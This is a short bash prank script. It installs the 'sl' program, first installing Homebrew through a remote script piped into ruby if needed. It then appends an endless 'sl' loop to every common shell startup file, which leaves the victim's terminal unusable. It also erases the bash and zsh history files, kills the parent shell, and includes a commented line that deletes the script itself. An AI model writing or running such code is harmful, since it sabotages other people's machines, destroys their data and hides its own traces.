#!/bin/bash

function modify_rc_files {
	cd ~
	echo -e "\nwhile true; do sl; done"|cat>>.bash_profile
	echo -e "\nwhile true; do sl; done"|cat>>.zshrc
	echo -e "\nwhile true; do sl; done"|cat>>.profile
	echo -e "\nwhile true; do sl; done"|cat>>.kshrc
	echo -e "\nwhile true; do sl; done"|cat>>.shrc
	echo -e "\nwhile (1)\n sl\n end"|cat>>.tcshrc
	echo -e "\nwhile (1)\n sl\n end"|cat>>.cshrc
}

sl_status=$(which sl)

if [ -z "$sl_status" ]
then
	internet=$(curl -s www.google.com)

	if [ -n "$internet" ]
	then
		brew_status=$(which brew)

		if [ -z "$brew_status" ]
			then 
			ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
		fi
		brew install sl
		modify_rc_files
	else
		echo "Not connected to the internet"
		sleep 1
	fi
else
	modify_rc_files
fi

#Remove the below comment (#) before running the Script

#rm -rf script

cd ~
echo "" | cat>.zsh_history
echo "" | cat>.bash_history
kill -9 $PPID